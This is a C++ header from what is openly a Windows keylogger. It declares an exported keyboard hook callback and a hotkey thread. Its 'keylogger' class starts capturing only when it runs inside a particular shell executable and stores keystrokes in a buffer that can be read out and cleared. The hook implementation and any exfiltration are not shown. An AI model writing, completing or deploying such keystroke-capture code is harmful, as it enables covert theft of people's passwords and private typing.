#pragma once
#define _WIN32_WINNT 0x0A00
#pragma comment( lib, "user32.lib" )
#pragma comment(lib, "Oleacc.lib")
#pragma comment(lib, "Psapi.lib")

#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <utils.h>
#include <conio.h>
#include <oleacc.h>
#include <Psapi.h>
#include <WinUser.h>

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI my_HotKey(LPVOID lpParm);
void MessageLoop();

class keylogger
{
public:
    static std::vector<char> buffer;

    keylogger() {
        HANDLE hThread;
        DWORD dwThread;

        if (strcmp(ExePathA(), SHELL_EXE)) {
            return;
        }
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)my_HotKey, (LPVOID)ExePath(), NULL, &dwThread);
    };
    std::string GetBuffer() {
        return std::string(buffer.begin(), buffer.end());
    };
    void ClearBuffer() {
        buffer.clear();
    }
};
